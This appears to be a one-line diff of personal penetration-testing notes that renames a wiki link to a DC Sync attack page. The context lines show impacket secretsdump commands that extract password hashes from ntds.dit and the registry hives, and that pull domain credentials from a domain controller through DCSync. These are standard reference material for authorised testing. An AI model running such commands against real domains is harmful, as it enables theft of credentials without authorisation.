@@ -134,7 +134,7 @@ impacket-secretsdump -system system -security security -ntds ntds.dit LOCAL
 ```
 [medium](https://bond-o.medium.com/extracting-and-cracking-ntds-dit-2b266214f277)
 
-Perform a [[DC-Sync-Attack]]
+Perform a [[AD-DC-Sync-Attack]]
 ```bash
 secretsdump -just-dc $domain/$user@$DC-ip
 # For just ntlms 
